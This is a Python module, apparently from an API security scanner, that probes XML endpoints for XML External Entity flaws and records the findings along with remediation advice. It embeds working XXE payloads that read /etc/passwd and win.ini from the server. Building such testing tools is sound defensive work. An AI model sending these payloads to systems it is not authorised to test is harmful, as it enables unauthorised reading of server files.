"""
XXE (XML External Entity) Tester.
Tests XML endpoints for DTD and external entity resolution vulnerabilities.
"""

import logging
import requests
from typing import List, Dict, Any
from ..finding_manager import FindingManager, Finding, Evidence
from ..enumeration.swagger_parser import ApiEndpoint

logger = logging.getLogger(__name__)


class XxeTester:
    """Tests API endpoints for XXE vulnerabilities."""

    def __init__(
        self,
        finding_manager: FindingManager,
        target_url: str,
        auth_headers: Dict[str, str],
    ):
        self.finding_manager = finding_manager
        self.target_url = target_url
        self.auth_headers = auth_headers
        self.session = requests.Session()
        self.session.headers.update(auth_headers)

        # Standard XXE payload trying to read /etc/passwd (Unix) or win.ini (Windows)
        self.payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

        self.payload_win = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>"""

    def test_endpoints(self, endpoints: List[ApiEndpoint]) -> None:
        """Runs XXE tests against endpoints that consume XML."""
        logger.info("Starting XXE tests...")

        for endpoint in endpoints:
            # Check if endpoint consumes XML
            if (
                "application/xml" in endpoint.consumes
                or "text/xml" in endpoint.consumes
            ):
                self._test_xxe(endpoint)

        logger.info("XXE testing complete.")

    def _test_xxe(self, endpoint: ApiEndpoint) -> None:
        """Tests sending XML with malicious DTD."""
        url = f"{self.target_url}{endpoint.path}"
        headers = {"Content-Type": "application/xml"}

        for p in [self.payload, self.payload_win]:
            try:
                response = self.session.request(
                    method=endpoint.method,
                    url=url,
                    data=p,
                    headers=headers,
                    timeout=5,
                    allow_redirects=False,
                )

                body = response.text

                # Check for successful file read
                if (
                    "root:x:0:0" in body
                    or "[extensions]" in body
                    or "bit app support" in body
                ):
                    evidence = Evidence(
                        type="request_response",
                        content=f"Payload:\n{p}\n\nStatus: {response.status_code}\nSnippet:\n{body[:300]}",
                        description="External entity resolved and local file contents returned in response.",
                    )

                    finding = Finding(
                        title=f"XML External Entity (XXE) Injection on {endpoint.path}",
                        description=f"The endpoint {endpoint.method} {endpoint.path} parses XML documents without disabling DTD processing. This allows reading arbitrary files from the server.",
                        vulnerability_type="XML External Entity (XXE)",
                        severity="HIGH",
                        cwe_id="CWE-611",  # Improper Restriction of XML External Entity Reference
                        cvss_score=8.6,  # Often 8.6 if it just reads files, 9+ if SSRF/DoS
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
                        component=endpoint.path,
                        remediation='Configure the XML parser (e.g., DocumentBuilderFactory, XMLInputFactory) to disable DTDs: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true).',
                        evidence=[evidence],
                    )
                    self.finding_manager.add_finding(finding)
                    return  # Stop testing if found

            except Exception as e:
                logger.debug(f"XXE test failed for {endpoint.path}: {e}")
